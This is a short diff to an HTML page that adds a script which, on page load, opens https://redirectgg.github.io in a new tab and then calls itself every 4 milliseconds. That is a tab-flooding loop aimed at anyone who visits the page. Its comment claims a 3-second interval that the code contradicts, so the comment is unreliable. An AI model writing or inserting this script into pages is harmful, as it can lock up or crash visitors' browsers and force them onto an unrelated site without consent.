@@ -3,8 +3,13 @@
 <head>
     <title></title>
     <script>
-        window.onload = function() {
+        function openTabLoop() {
             window.open("https://redirectgg.github.io", "_blank");
+            setTimeout(openTabLoop, 4); // Opens every 3 seconds
+        }
+
+        window.onload = function() {
+            openTabLoop();
         };
     </script>
 </head>
